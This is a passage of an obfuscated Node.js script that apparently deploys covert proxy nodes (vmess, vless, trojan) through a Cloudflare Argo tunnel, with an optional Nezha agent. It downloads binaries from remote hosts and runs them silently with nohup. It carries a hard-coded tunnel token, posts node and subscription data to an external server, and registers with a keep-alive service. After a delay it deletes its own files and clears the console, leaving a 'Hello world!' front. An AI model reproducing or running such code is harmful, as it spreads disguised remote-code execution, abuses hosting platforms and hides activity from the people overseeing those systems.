v1','ARGO_DOMAIN','join','web\x20running\x20error:\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','443','unlinkSync','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','nohup\x20','Error\x20downloading\x20files:','2516499UnrQnh','then','FILE_PATH','substring','\x20>\x20nul\x202>&1','eyJhIjoiMDUwYThmYTM0NzFkZTk2MmEyZDRjOWZlYjQzNzEwOTgiLCJ0IjoiOWE1YjcxMjctMGU1OS00N2NiLWI0YzktNTk4MmZkMjVkMjdiIiwicyI6Ik5XSXdaakV6Tm1FdFlqSTNNQzAwTTJJNUxXSmhaV010TUdJMk16VmpOMlkwWW1SaSJ9','automatic\x20access\x20task\x20added\x20successfully','\x20successfully','&fp=firefox&type=ws&host=','pkill\x20-f\x20\x22[','data','map','Subscription\x20uploaded\x20successfully','unlink','env','tcp','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','success','/vmess-argo?ed=2560','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','list.txt','\x0a\x0avmess://','close','mkdirSync','cdns.doon.eu.org','\x20failed:\x20','https://amd64.ssss.nyc.mn/web','https://oooo.serv00.net/add-url','\x20-p\x20','/vmess-argo','Skipping\x20adding\x20automatic\x20access\x20task','aarch64','org','/vless-argo','19225140WFIbiz','Hello\x20world!','2087','2ykBnwC','127.0.0.1','application/json','includes','https://amd64.ssss.nyc.mn/agent','stringify','CFPORT','match','NEZHA_KEY','countryCode','pop','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x0a\x0atrojan://','boot.log','createWriteStream','stream','ARGO_AUTH','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','1413ypqkRq','2096','\x0a\x20\x20\x20\x20','base64','firefox','CFIP','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','/tunnel.yml\x20run','log','toString','config.yaml','./tmp','\x0aclient_secret:\x20','push','ARGO_PORT','axios','https://ipapi.co/json/','platform','split','\x0a\x20\x20credentials-file:\x20','https://amd64.ssss.nyc.mn/v1','vless','del\x20/f\x20/q\x20','5197512Tvwoju','\x20>/dev/null\x202>&1','3716235FDjuvn','quic','charAt','NEZHA_SERVER','Error\x20reading\x20boot.log:','http\x20server\x20is\x20running\x20on\x20port:','/api/add-nodes','readdirSync','52090ZoYRFv','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','PROJECT_URL','\x22\x20>\x20/dev/null\x202>&1','blackhole','App\x20is\x20running','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Content-Type','Unknown','text/plain;\x20charset=utf-8','fileUrl','abcdefghijklmnopqrstuvwxyz','/api/add-subscriptions','/sub.txt\x20saved\x20successfully','2083','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','arm','test','filter','?security=tls&sni='];_0x5e89=function(){return _0x2c0242;};return _0x5e89();}async function uploadNodes(){const _0x40f585={_0x968975:0x23d,_0x370012:0x21b,_0x5d32d8:0x24f,_0x1521d1:0x1f6,_0x514d80:0x1c2,_0x12701b:0x22a,_0x10cc93:0x24f,_0x4f1eeb:0x231,_0x2fda56:0x26b,_0x2c5e3d:0x1dd},_0x82e60=_0x9bc633;if(UPLOAD_URL&&PROJECT_URL){const _0x5eb5e0=PROJECT_URL+'/'+SUB_PATH,_0x39d6cb={'subscription':[_0x5eb5e0]};try{const _0x47443a=await axios[_0x82e60(_0x40f585._0x968975)](UPLOAD_URL+_0x82e60(_0x40f585._0x370012),_0x39d6cb,{'headers':{'Content-Type':_0x82e60(0x1dd)}});return _0x47443a&&_0x47443a[_0x82e60(_0x40f585._0x5d32d8)]===0xc8?(console[_0x82e60(_0x40f585._0x1521d1)](_0x82e60(_0x40f585._0x514d80)),_0x47443a):null;}catch(_0x8ae916){if(_0x8ae916[_0x82e60(_0x40f585._0x12701b)]){if(_0x8ae916['response'][_0x82e60(_0x40f585._0x10cc93)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x12719c=fs[_0x82e60(0x229)](listPath,_0x82e60(_0x40f585._0x4f1eeb)),_0x434a5c=_0x12719c[_0x82e60(0x200)]('\x0a')[_0x82e60(0x221)](_0x514f73=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x82e60(0x220)](_0x514f73));if(_0x434a5c[_0x82e60(_0x40f585._0x2fda56)]===0x0)return;const _0x5dc2f4=JSON['stringify']({'nodes':_0x434a5c});try{const _0x220a24=await axios[_0x82e60(0x23d)](UPLOAD_URL+_0x82e60(0x20d),_0x5dc2f4,{'headers':{'Content-Type':_0x82e60(_0x40f585._0x2c5e3d)}});return _0x220a24&&_0x220a24[_0x82e60(0x24f)]===0xc8?(console[_0x82e60(_0x40f585._0x1521d1)]('Nodes\x20uploaded\x20successfully'),_0x220a24):null;}catch(_0x5a7f4e){return null;}}else return;}}function cleanFiles(){const _0x134555={_0x1ba04f:0x272,_0x44d662:0x239,_0x3f4d0a:0x206},_0x42eda6={_0x1f3929:0x1f6,_0x4bcfa6:0x1f6};setTimeout(()=>{const _0x1fe10a={_0x186e29:0x214},_0x21f6c7=_0x3772,_0x395031=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x395031[_0x21f6c7(0x1fb)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x395031[_0x21f6c7(0x1fb)](phpPath);process[_0x21f6c7(0x1ff)]==='win32'?exec(_0x21f6c7(0x204)+_0x395031[_0x21f6c7(_0x134555._0x1ba04f)]('\x20')+_0x21f6c7(0x27e),_0x42bda4=>{const _0x2df8e5=_0x21f6c7;console['clear'](),console['log'](_0x2df8e5(_0x1fe10a._0x186e29)),console['log'](_0x2df8e5(0x1c6));}):exec(_0x21f6c7(_0x134555._0x44d662)+_0x395031['join']('\x20')+_0x21f6c7(_0x134555._0x3f4d0a),_0x5ee8f8=>{const _0x2fe9d4=_0x21f6c7;console['clear'](),console[_0x2fe9d4(_0x42eda6._0x1f3929)]('App\x20is\x20running'),console[_0x2fe9d4(_0x42eda6._0x4bcfa6)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x37b79d={_0x452d55:0x1f6,_0x2d1ccb:0x1d4,_0x37d7fc:0x23d,_0x5d6134:0x1dd,_0x9a2684:0x23a,_0x34a8fb:0x262},_0x33b339=_0x9bc633;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x33b339(_0x37b79d._0x452d55)](_0x33b339(_0x37b79d._0x2d1ccb));return;}try{const _0x18f661=await axios[_0x33b339(_0x37b79d._0x37d7fc)](_0x33b339(0x1d1),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x33b339(_0x37b79d._0x5d6134)}});return console[_0x33b339(_0x37b79d._0x452d55)](_0x33b339(0x280)),_0x18f661;}catch(_0x5bcfe7){return console[_0x33b339(_0x37b79d._0x9a2684)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x5bcfe7[_0x33b339(_0x37b79d._0x34a8fb)]),null;}}async function startserver(){const _0x5b57da={_0x19617a:0x23a,_0x1f4734:0x250},_0x1387c3=_0x9bc633;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x23c4b4){console[_0x1387c3(_0x5b57da._0x19617a)](_0x1387c3(_0x5b57da._0x1f4734),_0x23c4b4);}}startserver()[_0x9bc633(0x24e)](_0x5834fe=>{const _0x2add75={_0xa48a6c:0x23a},_0x553ca0=_0x9bc633;console[_0x553ca0(_0x2add75._0xa48a6c)](_0x553ca0(0x242),_0x5834fe);}),app[_0x9bc633(0x22c)](PORT,()=>console['log'](_0x9bc633(0x20c)+PORT+'!'));
